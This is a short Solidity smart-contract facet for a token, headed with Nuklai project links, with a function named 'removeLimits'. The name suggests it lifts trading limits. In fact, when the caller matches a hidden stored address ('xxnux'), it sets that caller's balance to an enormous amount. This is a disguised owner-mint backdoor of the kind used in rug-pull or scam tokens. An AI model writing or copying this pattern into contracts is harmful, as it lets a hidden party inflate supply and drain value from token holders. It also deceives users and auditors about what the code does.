/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.nukl.ai
 * X: https://twitter.com/NuklaiData
 * Telegram:  https://t.me/NuklaiOfficial
 * Discord: https://discord.gg/2VeHmckwAC
 */

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                4206900000 *
                42000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
